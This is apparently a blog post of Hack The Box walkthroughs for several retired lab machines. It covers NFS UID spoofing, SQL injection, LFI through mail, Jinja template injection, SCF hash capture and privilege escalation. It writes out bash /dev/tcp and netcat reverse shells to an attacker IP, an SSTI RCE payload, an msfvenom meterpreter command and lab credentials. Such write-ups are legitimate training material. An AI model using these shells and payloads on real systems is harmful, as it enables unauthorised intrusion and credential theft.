---
layout: post
title: Easy
subtitle: Easy Retired Machines
tags: [hack]
---
### 1. Squashed - Linux. (NFS Imitation through UID, NFS php-reverse-shell, NFS configuration, .Xauthority cookie usurpation, w and xwd command)

In this we are in front of a Linux machine which is hosting several services. Among them, we found interesting, a SSH, HTTP and NFS services on defaults ports. The NFS is offered through a rpcbind on port 111:

<div style="text-align:center">
	<img src="{{ 'assets/img/HTB/Pasted image 20221113113455.png' | relative_url }}" text-align="center"/>
</div>

We explore the web page but it seems that it doesn't have anything relevant. Then, we proceed with the NFS enumeration:

<div style="text-align:center">
	<img src="{{ 'assets/img/HTB/Pasted image 20221113114057.png' | relative_url }}" text-align="center"/>
</div>

The NFS server is offering two directories. One is the personal directory of a user of the server and the other is the web-server root directory.

Thus, we proceed to mount the directories on our machine:

```bash
sudo mkdir /mnt/1
sudo mount -t nfs squashed.htb:/var/www/html /mnt/1
```

This command tells the kernel to attach the filesystem found on device (which is of type 'nfs') at the directory /mnt/1. However, we found that we don't have permission to access the directory:

<div style="text-align:center">
	<img src="{{ 'assets/img/HTB/Pasted image 20221113114849.png' | relative_url }}" text-align="center"/>
</div>

If we check the property of the directory we see that is owned by the UID 2017 and belongs to the group 'www-data'. We can attemp to create a new user and change his UID to make it coincide to the require UID.

```bash
sudo useradd xela
```

This user will by default have a UID/GID of the highest ID found in /etc/passwd , plus one. Usually this will be 1001 . To change the UID and the GID, we run the following command:

```bash
sudo usermod -u 2017 xela
sudo groupmod -g 2017 xela
```

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/HTB/Pasted image 20221113120624.png' | relative_url }}" text-align="center"/>
</div>

Now we have to found the form to include a file to trigger a reverse shell. In the .htaccess file we found a PHP reference, so the web server is PHP-based and we can try to trigger a [php-reverse-shell](https://github.com/pentestmonkey/php-reverse-shell) 

<div style="text-align:center">
	<img src="{{ 'assets/img/HTB/Pasted image 20221113122851.png' | relative_url }}" text-align="center"/>
</div>

We do this by locating on the contents of the shared folder, /mnt/1 a shell.php and accessing the file by the web. Thus we gain access to the user alex:

<div style="text-align:center">
	<img src="{{ 'assets/img/HTB/Pasted image 20221113123636.png' | relative_url }}" text-align="center"/>
</div>

It would be worth to check the NFS configuration (on /etc/exports) in order to understand better what we do and why have we been able to do it.

<div style="text-align:center">
	<img src="{{ 'assets/img/HTB/Pasted image 20221113124317.png' | relative_url }}" text-align="center"/>
</div>

The configuration file have two options that we may want focus on; 'root_squash' and 'rw'. *The first one downgrade users wo attemp to access the share as root (UID/GID 0) to the *nfsnobody* user, preventing an attacker from uploading binaries with the SUID bit set*.

*A similar setting is 'all_squash' , which would apply that same logic to all users, essentially downgrading everyone to nfsnobody*. Luckily, that configuration has not been explicitly specified, therefore we can imitate non-root users (as we did) to write files to the web root directory.

The second option, the 'rw', configure the shared directory to give the user write/read permissions. We have to note that the same option is not established on the /home/ross directory so we couldn't be able to write anything on it.

Now, we are going to enumerate the second NFS share. We are going to apply the same imitation strategy although we alrready know that we will not be able to write anything on it but still can read the files. We change the UID of our created user 'xela'. First we mount the NFS share and see the propierty:

<div style="text-align:center">
	<img src="{{ 'assets/img/HTB/Pasted image 20221113130155.png' | relative_url }}" text-align="center"/>
</div>

Then, we apply the same commands to change the UID/GID of the user 'xela':

<div style="text-align:center">
	<img src="{{ 'assets/img/HTB/Pasted image 20221113130429.png' | relative_url }}" text-align="center"/>
</div>

This way we can now check the files on the directory that otherwise we couldn't be able to read:

<div style="text-align:center">
	<img src="{{ 'assets/img/HTB/Pasted image 20221113131128.png' | relative_url }}" text-align="center"/>
</div>

X is a portable, network-transparent window system for managing a windowed GUI. The presence of .Xauthority and .xsession files in the home directory indicate that a display might be configured, with 'ross' potentially already authenticated.

The .Xauthority file is used to store credentials in the form of cookies used by xauth when authenticating X sessions. When a session is started, the cookie is then used to authenticate the subsequent connections to that specific display we can steal the cookie and therefore act as the authenticated 'ross' user and interact with the display.

<div style="text-align:center">
	<img src="{{ 'assets/img/HTB/Pasted image 20221113131537.png' | relative_url }}" text-align="center"/>
</div>

In order to transport it, we first encoded it with 'base64' and then we take it to the /tmp folder of the target machine on user alex:

<div style="text-align:center">
	<img src="{{ 'assets/img/HTB/Pasted image 20221113142324.png' | relative_url }}" text-align="center"/>
</div>
<div style="text-align:center">
	<img src="{{ 'assets/img/HTB/Pasted image 20221113142029.png' | relative_url }}" text-align="center"/>
</div>

<br />

Then, setting the cookie is as easy as pointing the enviroment variable 'XAUTOHRITY' to our cookie file:

```bash
export XAUTHORITY=/tmp/.Xauthority
```

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/HTB/Pasted image 20221113142429.png' | relative_url }}" text-align="center"/>
</div>

Thus, with this, we have usurpate the ross's session and we can interact with the display. The w command is **a built-in tool that allows administrators to view information about users that are currently logged in**. This includes their username, where they are logged in from, and what they are currently doing:

<div style="text-align:center">
	<img src="{{ 'assets/img/HTB/Pasted image 20221113143124.png' | relative_url }}" text-align="center"/>
</div>

We can see that the display used is ':0'. We now are going to use the 'xwd' command which simply dumps an image of an X window, to get a screenshot of the display in its current state:

```bash
xwd -root -screen -silent -display :0 > /tmp/screen.xwd
```

<br />

Then, we move the file to our local machine through the NFS share and convert the .xwd to .png and open it with the 'feh' command:

<div style="text-align:center">
	<img src="{{ 'assets/img/HTB/Pasted image 20221113143711.png' | relative_url }}" text-align="center"/>
</div>

Thus, we have found root credentials: root:cah$mei7rai9A.

<br />

### 2. Timelapse - Windows. (SMB enumeration, zip2john, pfx2john, PFX file SSL cert and key, Evil-Winrm with cert and keys, Windows Command-History, LAPS_Readers group Get-ADComputer)

In this case we are in front of a Windows machine that is hosting a SMB server and a wmans (Windows Manager Server) reachable through [Evil-WinRM](https://github.com/Hackplayers/evil-winrm) tool:

<div style="text-align:center">
	<img src="{{ 'assets/img/HTB/Pasted image 20221113171057.png' | relative_url }}" text-align="center"/>
</div>

Thus, we begin with a SMB enumeration:

<div style="text-align:center">
	<img src="{{ 'assets/img/HTB/Pasted image 20221113171629.png' | relative_url }}" text-align="center"/>
</div>

Then, we access to the NETLOGON share in order to see if we gather anything useful but we don't have permissions to list or read the share so we pass to the following share:

<div style="text-align:center">
	<img src="{{ 'assets/img/HTB/Pasted image 20221113171820.png' | relative_url }}" text-align="center"/>
</div>

We find a .zip backup file that we download with the 'get' command and try to unzip but a password is required:

<div style="text-align:center">
	<img src="{{ 'assets/img/HTB/Pasted image 20221113171925.png' | relative_url }}" text-align="center"/>
</div>

We attemp to crack the password using the 'zip2john' utility and then JohnTheRipper:

<div style="text-align:center">
	<img src="{{ 'assets/img/HTB/Pasted image 20221113172156.png' | relative_url }}" text-align="center"/>
</div>

When we unzip the file is given to us a .pfx file- The .pfx file, which is in a PKCS#12 format, contains the SSL certificate (public keys) and the corresponding private keys. Sometimes, you might have to import the certificate and private keys separately in an unencrypted plain text format to use it on another system. When we use the 'string' command over the binary we see a username:

<div style="text-align:center">
	<img src="{{ 'assets/img/HTB/Pasted image 20221113173036.png' | relative_url }}" text-align="center"/>
</div>

This confirms that legacyy is in fact a username.

Thus, we use the following command to extract the private keys and the certificate from the .pfx file in order to use it with Evil-WinRm to gain foothold on the machine:

```bash
openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out key.pem -nodes 
openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out cert.pem
```

But, when we attemp to extract the keys a password is again required:

<div style="text-align:center">
	<img src="{{ 'assets/img/HTB/Pasted image 20221113173111.png' | relative_url }}" text-align="center"/>
</div>

Thus, we attemp to use again JohnTheRipper but this time with 'pfx2john':

<div style="text-align:center">
	<img src="{{ 'assets/img/HTB/Pasted image 20221113173150.png' | relative_url }}" text-align="center"/>
</div>

Then, we extract by introducing when is required the password with the command above and use the following Evil-WinRm command to use it to log-in:

```bash
evil-winrm -i 10.10.11.152 -c cert.pem -k key.pem -S 
```

The '-S' flag is because we are attempting to login through the port 5986 that have SSL incorporate.

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/HTB/Pasted image 20221113173459.png' | relative_url }}" text-align="center"/>
</div>

Now, we are going to attemp to elevate privielges by view the command history:

```powershell
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

And we find the credentials svc_deploy:E3R$Q62^12p7PLlC%KWaxuaV

<div style="text-align:center">
	<img src="{{ 'assets/img/HTB/Pasted image 20221113173938.png' | relative_url }}" text-align="center"/>
</div>

So we log-in as that user with evil-winrm:

<div style="text-align:center">
	<img src="{{ 'assets/img/HTB/Pasted image 20221113174044.png' | relative_url }}" text-align="center"/>
</div>

Again, the -S flag is because we have to enable the SSL.

Then, in order to seek new vectors of privesc, we check what groups our user belongs to:

```powershell
net user svc_deploy
```

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/HTB/Pasted image 20221113174522.png' | relative_url }}" text-align="center"/>
</div>

Then, we realize that we belong to the 'LAPS_Readers' the "Local Administrator Password Solution" (LAPS) is used to manage local account passwords of Active Directory computers. We can run the following command to get information about the users and his passwords

```powershell
Get-ADComputer -Filter 'ObjectClass -eq "computer"' -Property *
```

The **Get-ADComputer** cmdlet gets a computer or performs a search to retrieve multiple computers, since we have permssion to see the passwords, we will see the credentials too:

<div style="text-align:center">
	<img src="{{ 'assets/img/HTB/Pasted image 20221113180942.png' | relative_url }}" text-align="center"/>
</div>

Thus:

<div style="text-align:center">
	<img src="{{ 'assets/img/HTB/Pasted image 20221113181037.png' | relative_url }}" text-align="center"/>
</div>

<br />

### 3. Trick - Linux. (DNS server, DNS zones, Dig, Sqlmap advanced features, LFI through smtp, Restart Service PrivEsc).

In this case, we perfom a Nmap scan:

```bash
ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.166 | grep '^[0-9]' | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
nmap -p$ports -sC -sV 10.10.11.166
```

The command above first quicly scan the ports and catch those that are open (first perfom a Nmap scan, then catch the lines that starts with a number, then catch only the number, then order the numbers in a string separate by commas) and then perform a "version detection" and "scripts by default" over de discover ports:

<div style="text-align:center">
	<img src="{{ 'assets/img/HTB/Pasted image 20221114092438.png' | relative_url }}" text-align="center"/>
</div>

We can see that the machine is hosting the SSH, SMTP, DNS and HTTP services on default ports. 

First, we start with the HTTP web enumeration but it seems that it doesn't keep nothing relevant, only, that is host by a Nginx 1.14.2 web server.

Thus, we proceed to interact with the DNS Server. DNS is an application layer protocol which translates a domain to an IP and although and reverse.

A command wich allow us to interact with a DNS server is 'dig'. Using dig we can perform a reverse lookup and attempt to get a domain name from the DNS server:

```bash
dig @10.10.11.166 -x 10.10.11.166
```

It seems that we found a domain: trick.htb.

<div style="text-align:center">
	<img src="{{ 'assets/img/HTB/Pasted image 20221114173725.png' | relative_url }}" text-align="center"/>
</div>

Thus, we add the domain to the /etc/hosts:

```bash
echo '10.10.11.166 trick.htb' | sudo tee -a /etc/hosts
```

We can try to initiate a zone transfer and attempt to acquire other domain names associated with trick.htb. *DNS is broken up into many different zones, a zone is a part of domain name space that is hosted and served by a DNS server*. For example, example.com and all the subdomains it may have (eg. subdomain.example.com ) are a zone. 

A zone transfer is a request to copy an entire zone.

<div style="text-align:center">
	<img src="{{ 'assets/img/HTB/Pasted image 20221114175941.png' | relative_url }}" text-align="center"/>
</div>

Thus, we discover a zone called "preprod-payroll.trick.htb", we add it to our  /etc/host file and proceed to explore the zone. Thus, we discover a login portal:

<div style="text-align:center">
	<img src="{{ 'assets/img/HTB/Pasted image 20221114180716.png' | relative_url }}" text-align="center"/>
</div>

Then, we try to verify it is SQLi vulnerable. For that we can employ SQLmap, first, we capture with a Proxy like BurpSuite the request and copy it to a file 'request.txt' and then use it in the following command:

```bash
sqlmap -r request.txt -p "username,password"
```

Then, sqlmap will began to test the parameter and will conclude that the parameter 'username' is indeed an injection point as a Time-Based SQL injection. because of the time bound nature of the vulnerability, the extraction of data is going to be very slow. Let's see if there are any other valid injection techniques sqlmap has the following techniques that can be set: B; Boolean-based blind, E; Error-based, U; Union query-based, S; Stacked queries, T; Time-based blind, Q; Inline queries.

Because we don't want slow data extraction we delete T and Q and left the others in the following command. And we are going to increse the risk of the test in order to ensure that all the injection techniques are properly tested:

```bash
sqlmap -r request.txt -p "username,password" --level 5 --risk 3 --technique=BEUS -batch
```

Finally we retrieve a database; 'payroll_db', a tables called 'users' and finallly and administrator user: 'Enemigosss:SuperGucciRainbowCake'.

```bash
sqlmap -r request.txt -p "username" -D payroll_db -T users --dump  --level 5 --risk 3 --technique=BEUS --batch
```

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/HTB/Pasted image 20221114183501.png' | relative_url }}" text-align="center"/>
</div>

But the user don't seems to be useful because we don't succeed to log in the web. We have to try something else.

Lets see what are the privileges of the current user:

```bash
sqlmap -r request.txt -p "username" --privileges
```

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/HTB/Pasted image 20221114184518.png' | relative_url }}" text-align="center"/>
</div>

The outputs shows that our user can read files, we can use this in order to enumerate slightly the server:

```bash
sqlmap -r request.txt -p "username" --batch --file-read=/etc/passwd
```

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/HTB/Pasted image 20221114184936.png' | relative_url }}" text-align="center"/>
</div>

Thus, we go to the path in which is stored the retrieved file and we discover an usuario called michael:

<div style="text-align:center">
	<img src="{{ 'assets/img/HTB/Pasted image 20221114190044.png' | relative_url }}" text-align="center"/>
</div>

That, by the UID, it seems to be a real user of the server. Then we can attemp to read the sites file of the web server in order to discover other zones:

```bash
sqlmap -u http://preprod-payroll.trick.htb/ajax.php?action=login -- data="username=abc&password=abc" -p username --batch --file-read=/etc/nginx/sites-enabled/default
```

The file again gets stored on: /root/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/\_etc\_nginx\_sites-enabled\_default and it seems that its appears another zone:

<div style="text-align:center">
	<img src="{{ 'assets/img/HTB/Pasted image 20221114190958.png' | relative_url }}" text-align="center"/>
</div>

We add it to our /etc/hosts file and try to access it. Gobuster don't offer anything useful but Wappalyzer tell us that is PHP-based:

<div style="text-align:center">
	<img src="{{ 'assets/img/HTB/Pasted image 20221114193006.png' | relative_url }}" text-align="center"/>
</div>

We can check if this functionality is LFI vulnerable. After some security Security measures we succed to retrieve the /etc/hosts file:

<div style="text-align:center">
	<img src="{{ 'assets/img/HTB/Pasted image 20221114193914.png' | relative_url }}" text-align="center"/>
</div>

Thus, we can do the following. Any message that we send to the Michael user on the machine through the smtp server will be stored on /var/mail/michael. Thus, we setup a netcat listener on port 1337 and send the following email:

<div style="text-align:center">
	<img src="{{ 'assets/img/HTB/Pasted image 20221114200046.png' | relative_url }}" text-align="center"/>
</div>

This will trigger a connection that will bring us a reverse-shell. Then, without exit the connection with the smtp server we go to the direction: ...//....//....//....//....//....//var/mail/michael

And we have a shell. In order to elevate our shell we can steal the ssh key and login through SSH:

<div style="text-align:center">
	<img src="{{ 'assets/img/HTB/Pasted image 20221114201645.png' | relative_url }}" text-align="center"/>
</div>

Then we seek a vector to elevate our privileges. When we run 'sudo -l' we see that we are allowed to restart a service ass root without password:

<div style="text-align:center">
	<img src="{{ 'assets/img/HTB/Pasted image 20221114215402.png' | relative_url }}" text-align="center"/>
</div>

Then, we are gonna check the fail2ban's configuration in order to search for some missconfiguration that could allow us to modify the service or some thing of the kind. 

Thus, we go to /etc/fail2ban and list the directories, we found one that belongs to a group which we form part of:

<div style="text-align:center">
	<img src="{{ 'assets/img/HTB/Pasted image 20221114215756.png' | relative_url }}" text-align="center"/>
</div>

Then we access it and list it. On it, we see multiple configuration files, we are interested on iptables-multiports.conf. As fare as we know, iptables is a firewall software that can implements measures to detect and ban malicious users on a system. This file have some basic configurations features:

<div style="text-align:center">
	<img src="{{ 'assets/img/HTB/Pasted image 20221114220957.png' | relative_url }}" text-align="center"/>
</div>

Ass we have permissions over the action.d file since we are part of the security group, we can't modify files but we can modify the contents of the directory so in order to make us owners of the file we perfom the following action:

```bash
mv iptables-multiport.conf .old; 
cp .old iptables-multiport.conf 
ls -l iptables-multiport.conf
```

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/HTB/Pasted image 20221114221406.png' | relative_url }}" text-align="center"/>
</div>

Thus, we know modify the propierty of the file and we can now write on it following the established permissions. Then, we write a reverse-shell script on /tmp:

```bash
#!/bin/bash
bash -i >& /dev/tcp/10.10.16.9/1337 0>&1
```

And we give it execute permissions with chmod. Then, we modify the file to force the service to act executing the script once and over when a user gets banned:


```defaul
actionban= /tmp/shell.sh
```

Then, we restart the service as sudo to enable the new configuration and attemp to log as the michael user wrong several times until a shell in our netcat listener spawn:

<div style="text-align:center">
	<img src="{{ 'assets/img/HTB/Pasted image 20221114223128.png' | relative_url }}" text-align="center"/>
</div>

<br />


### 4. Return - Windows. (LDAP Printer credentials, Service Binary Path)

In this case we have a machine which is hosting several services:

```bash
ports=$(nmap -p- --min-rate 10000 10.10.11.108 | grep '^[0-9]' | cut -d '/' -f1 | tr '\n' ',' | sed s/,$//); nmap -p$ports -sV -sC 10.10.11.108
```

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/HTB/Pasted image 20221115094841.png' | relative_url }}" text-align="center"/>
</div>

Among them we can find HTTP, SMB and WinRM services. Lets explore the web.

We launch over it Gobuster and Wappalyzer, Gobuster doesn't bring us anything useful and Wappalyzer tell us that is PHP-based.

<div style="text-align:center">
	<img src="{{ 'assets/img/HTB/Pasted image 20221115095639.png' | relative_url }}" text-align="center"/>
</div>

Exploring manually the web,  we found a settings.php page that store information about a printer:

<div style="text-align:center">
	<img src="{{ 'assets/img/HTB/Pasted image 20221115095849.png' | relative_url }}" text-align="center"/>
</div>

These devices store LDAP and SMB credentials, in order for the printer to query the user list from Active Directory, and to be able to save scanned files to a user drive. These configuration pages typically allow the domain controller or file server to be specified. 

Thus, we can change the Server Address field in order to make it point to our server and capture the request to catch the credentials:

<div style="text-align:center">
	<img src="{{ 'assets/img/HTB/Pasted image 20221115100227.png' | relative_url }}" text-align="center"/>
</div>

This credentials would be valid to enter the machine through the WinRM service:

```bash
evil-winrm -i 10.10.11.108 -u svc-printer -p 1edFg43012!!
```

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/HTB/Pasted image 20221115100907.png' | relative_url }}" text-align="center"/>
</div>

Enumerating the groups that the user belong to, we found that our user belong, among others, to the Server Operator group. Acording to the [documentation](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#server-operators): Members of the Server Operators group can administer domain controllers. This group exists only on domain controllers. By default, the group has no members. Members of the Server Operators group can take the following actions: sign in to a server interactively, create and delete network shared resources, *start and stop services*, back up and restore files, format the hard disk drive of the computer, and shut down the computer.

Then, we can try to modify a service binary path in order to obtain a reverse shell. First, we upload a netcat executable and test if the executable is valid for the version of the machine:

<div style="text-align:center">
	<img src="{{ 'assets/img/HTB/Pasted image 20221115102623.png' | relative_url }}" text-align="center"/>
</div>

The error message talking about socket tell us that iindeed is valid and then, we modify a service runned by Administrator, for example sc.exe:

```powershell
sc.exe config vss binPath="C:\Users\svc-printer\Desktop\nc.exe -e cmd.exe 10.10.16.9 1234"
```

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/HTB/Pasted image 20221115103509.png' | relative_url }}" text-align="center"/>
</div>

And then we set up a Netcat listener and then stop and start the service to run our command:

```powershell
sc.exe stop vss
sc.exe start vss
```

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/HTB/Pasted image 20221115104108.png' | relative_url }}" text-align="center"/>
</div>

<br />


### 5. Late - Linux. (Flask framwork, Jinja SSTi, Pspy)

In this case we have a machine that is hosting SSH and HTTP services on defaults ports. 

<div style="text-align:center">
	<img src="{{ 'assets/img/HTB/Pasted image 20221125095422.png' | relative_url }}" text-align="center"/>
</div>

So, we go to the web in order to do exploration job. Gobuster don't show anything useful and Wappalyzer tell us that the system behind is Ubuntu:

<div style="text-align:center">
	<img src="{{ 'assets/img/HTB/Pasted image 20221125095601.png' | relative_url }}" text-align="center"/>
</div>

In manual exploration we see a link that leads to image.late.htb

<div style="text-align:center">
	<img src="{{ 'assets/img/HTB/Pasted image 20221125095924.png' | relative_url }}" text-align="center"/>
</div>

Then, we add the domain to the /etc/hosts file and proceed to follow the link:

<div style="text-align:center">
	<img src="{{ 'assets/img/HTB/Pasted image 20221125100001.png' | relative_url }}" text-align="center"/>
</div>

The page results to be a image-to-text converter that use the Flask framework. Searching for some [information](https://www.digitalocean.com/community/tutorials/how-to-use-templates-in-a-flask-application) Flask is a lightweight Python web framework that provides useful tools and features for creating web applications in the Python Language. Among other things in the relative of 'Presentation Logic', Flask use the [Jinja](https://jinja.palletsprojects.com/en/3.0.x/) templating language to render HTML templates. 

A template is a file that can contain both fixed and dynamic content that is merged by a engine, this can be dangerous because, if the dynamic data (usually pased by the user) is not correctly saned, it can lead to the RCE execution by the template engine. 

This is more commonly known as [Server Side Template Injection](https://portswigger.net/web-security/server-side-template-injection).

So, we have to find a way to include a command in order to discover if the engine is indeed vulnerable. First, we [found](https://jinja.palletsprojects.com/en/3.1.x/templates/) that the syntax of the Jinja template is \{\{\}\}:

<div style="text-align:center">
	<img src="{{ 'assets/img/HTB/Pasted image 20221125101039.png' | relative_url }}" text-align="center"/>
</div>

Then we write a script with {{7\*7}} in order to found if the output returned contain the operation performed, indicating a command processing by the engine but we cant upload the file because the web doesn't recognize a image on it. 

So we can write the payload on plain text using a text editor and then catch a cutout to include the test payload into an image and upload this image onto the template engine:

<div style="text-align:center">
	<img src="{{ 'assets/img/HTB/Pasted image 20221125120125.png' | relative_url }}" text-align="center"/>
</div>

Then, when we upload the image, a file text will download to our machine and the result contain the operation processed:

<div style="text-align:center">
	<img src="{{ 'assets/img/HTB/Pasted image 20221125120205.png' | relative_url }}" text-align="center"/>
</div>

Indicating that the template engine process the commands, so we must find a valid payload to gain RCE over the server. On this [page](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2) we find the following payload:

```defaul
self._TemplateReference__context.namespace.__init__.__globals__.os.popen('id').read()
```

So we cutout the following line as follows:

<div style="text-align:center">
	<img src="{{ 'assets/img/HTB/Pasted image 20221125121905.png' | relative_url }}" text-align="center"/>
</div>

And upload the image obtaining:

<div style="text-align:center">
	<img src="{{ 'assets/img/HTB/Pasted image 20221125122020.png' | relative_url }}" text-align="center"/>
</div>

Thus, we have gained RCE over the machine, we try to get a revershell by severals commands using tcp sockets and netcat but non of it worked. How ever,  the machine has the SSH port open, this means that the user 'svc_acc' must have a ssh-key on .ssh/id_rsa file so we employ the following image to retrieve it:

<div style="text-align:center">
	<img src="{{ 'assets/img/HTB/Pasted image 20221125123700.png' | relative_url }}" text-align="center"/>
</div>

Obtaining:

<div style="text-align:center">
	<img src="{{ 'assets/img/HTB/Pasted image 20221125123719.png' | relative_url }}" text-align="center"/>
</div>

So we change the credentials of the key and log in the machine with it:

<div style="text-align:center">
	<img src="{{ 'assets/img/HTB/Pasted image 20221125123745.png' | relative_url }}" text-align="center"/>
</div>

After enumeration job we discover a script property of svc_acc: 

<div style="text-align:center">
	<img src="{{ 'assets/img/HTB/Pasted image 20221125164715.png' | relative_url }}" text-align="center"/>
</div>

Aparently it sends a message to the root every time someone logs with SSH. With [pspy](https://github.com/DominicBreuker/pspy) this is a tool that allows the monitorizing of linux processes without root permissions.

We transport this tool ove ssh through scp command:

<div style="text-align:center">
	<img src="{{ 'assets/img/HTB/Pasted image 20221125173931.png' | relative_url }}" text-align="center"/>
</div>

And run it on the victim machine:

<div style="text-align:center">
	<img src="{{ 'assets/img/HTB/Pasted image 20221125174000.png' | relative_url }}" text-align="center"/>
</div>

And then, in order to trigger the script, we log in in another session and see the output of pspy:

<div style="text-align:center">
	<img src="{{ 'assets/img/HTB/Pasted image 20221125174552.png' | relative_url }}" text-align="center"/>
</div>

It seems that, every time somebody logs in with SSH then root executes the script. This combined with the fact that we have writeable permissions of the file gives a way to make us root.

We simply write the following line on the script:

```bash
echo "bash -i >& /dev/tcp/10.10.16.9/4444 0>&1" >> /usr/local/sbin/ssh-alert.sh
```

Then, we setup a netcat listener on port 1337 and login again:

<div style="text-align:center">
	<img src="{{ 'assets/img/HTB/Pasted image 20221125175321.png' | relative_url }}" text-align="center"/>
</div>

<br />

### 6. Driver - Windows (Responder, SCF file injection, evil-winrm, meterpreter session, isolated services session, local_exploit_suggester, ricoh_driver_privesc)

In this case, we have a server that is hosting a web page, a SMB server and a windows management server:

<div style="text-align:center">
	<img src="{{ 'assets/img/HTB/Pasted image 20221123123034.png' | relative_url }}" text-align="center"/>
</div>

When we attemp to explore the web page we are asked about admin's credentials but 'admin:admin' seems to be successful:

<div style="text-align:center">
	<img src="{{ 'assets/img/HTB/Pasted image 20221123123149.png' | relative_url }}" text-align="center"/>
</div>

First of all, we see that exists an email which is bond to a domain so we add the following line to /etc/hosts:

<div style="text-align:center">
	<img src="{{ 'assets/img/HTB/Pasted image 20221123123537.png' | relative_url }}" text-align="center"/>
</div>

The we explore the server. First, wappalyzer tell us that the web-server is PHP-based and the OS Server beyond is Windows:

<div style="text-align:center">
	<img src="{{ 'assets/img/HTB/Pasted image 20221123123843.png' | relative_url }}" text-align="center"/>
</div>

Gobuster don't tell us anything useful. But manual exploring lead us to an upload feature:

<div style="text-align:center">
	<img src="{{ 'assets/img/HTB/Pasted image 20221123124549.png' | relative_url }}" text-align="center"/>
</div>

The description message tell us that if we upload a firmware model if will be tested by a operator team. 

Since we are in a Windows Machine, we can try to do a SCF file injection attack. 

It is mentioned that the firmware gets uploaded to a file share and is reviewed manually by the team internally. Since each file is reviewed manually and it is uploaded to an SMB share we could potentially upload a file that, when executed, makes a connection back to our local machine using SMB, thus allowing us to grab an NTLM hash. Since every file is opened for review purposes we can upload a Shell Command File (.scf) with a simple command to grab a single file from our local machine.

The SCF stands for Shell Command File and is a file format that supports a very limited set of Windows Explorer commands, such as opening a Windows Explorer window or showing the Desktop. The thing is that we can make a .scf file that that loads its icon image from an URL and provoke in that way to a SSRF attack through SMB concluding with a gathering of credentials hashs

```scf
[Shell] 
Command=2 
IconFile=\\<LocalIP>\whatever 
[Taskbar] 
Command=ToggleDesktop
```


When we upload this file onto the share the file will try to download his IconFile through a SMB connection to our local machine. We have to remember that, because SMB requires authentication, it will try to autenticate to our computer and with the [Responder](https://github.com/lgandx/Responder) tool we can catch this credentials:

```bash
python3 Responder.py -Pv -I tun0
```

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/HTB/Pasted image 20221123172211.png' | relative_url }}" text-align="center"/>
</div>

And then with John The Ripper:

<div style="text-align:center">
	<img src="{{ 'assets/img/HTB/Pasted image 20221123174736.png' | relative_url }}" text-align="center"/>
</div>

And we use this credentials to login with Evil-winrm:

```bash
evil-winrm -i 10.10.11.106 -u tony -p liltony
```

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/HTB/Pasted image 20221123180714.png' | relative_url }}" text-align="center"/>
</div>

Now we have to upgrade our privileges. The first thing we can try is to pass to a meterpreter session. In order to do that, first we create an executable and start the msfconsole in order to initiate a multihandler configuring it correctly:

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.16.9 LPORT=4444 -f exe > shell.exe; msfconsole -x db_status
```

Then, we upload and execute the malicious binary:

<div style="text-align:center">
	<img src="{{ 'assets/img/HTB/Pasted image 20221123182307.png' | relative_url }}" text-align="center"/>
</div>

It is convinient to note that the binary has to be in the same directory in which we start the evil-winrm session, otherwise we would have to specified the path to the shell.

Then, we have a meterpreter session:

<div style="text-align:center">
	<img src="{{ 'assets/img/HTB/Pasted image 20221123183318.png' | relative_url }}" text-align="center"/>
</div>

Enumeration of the processes (ps) that are currently running on the system we can see that we are on session 0 , meaning that the meterpreter process is running on a non-interactive isolated services session.

<div style="text-align:center">
	<img src="{{ 'assets/img/HTB/Pasted image 20221123183828.png' | relative_url }}" text-align="center"/>
</div>

We can try and migrate (migrate) to a process, explorer for example, that has a session id 1 , which means it is interactive:

<div style="text-align:center">
	<img src="{{ 'assets/img/HTB/Pasted image 20221123184113.png' | relative_url }}" text-align="center"/>
</div>

Now that we have a session that is not isolated we can perform recon job with the auxiliary module of metasploit: multi/recon/local_exploit_suggester

First, we background our session with Ctrl+Z and use the module:

<div style="text-align:center">
	<img src="{{ 'assets/img/HTB/Pasted image 20221123184403.png' | relative_url }}" text-align="center"/>
</div>

At the end of the module we can see an output that displays the severals exploit that the target is vulnerable.

<div style="text-align:center">
	<img src="{{ 'assets/img/HTB/Pasted image 20221123185651.png' | relative_url }}" text-align="center"/>
</div>

So we choose any of them we grant more privileges, like exploit/windows/local/ricoh_driver_privesc. We configure and run it:

<div style="text-align:center">
	<img src="{{ 'assets/img/HTB/Pasted image 20221124093834.png' | relative_url }}" text-align="center"/>
</div>

And we run it:

<div style="text-align:center">
	<img src="{{ 'assets/img/HTB/Pasted image 20221124093855.png' | relative_url }}" text-align="center"/>
</div>


### 7. GoodGames - Linux (SQLinjection, Decodify, Server-Side Tempalte Injection SSTi Flask, Docker container, home's directory mounted, mount, password recycling, Port Scanning without nmap, SUID file on mount missconfiguration directory.)

In this case we have a machine that is hosting a web page:

<div style="text-align:center">
	<img src="{{ 'assets/img/HTB/Pasted image 20221126140816.png' | relative_url }}" text-align="center"/>
</div>

When we try to explore the web we don't obtain anything useful but we some input fileds at login and searchs bar. 

Fuzzing with tools like SQLmap we find that the log field is vulnerable to SQLi:

<div style="text-align:center">
	<img src="{{ 'assets/img/HTB/Pasted image 20221126141202.png' | relative_url }}" text-align="center"/>
</div>

We retrieve fom the database a username and a password:

<div style="text-align:center">
	<img src="{{ 'assets/img/HTB/Pasted image 20221126141331.png' | relative_url }}" text-align="center"/>
</div>

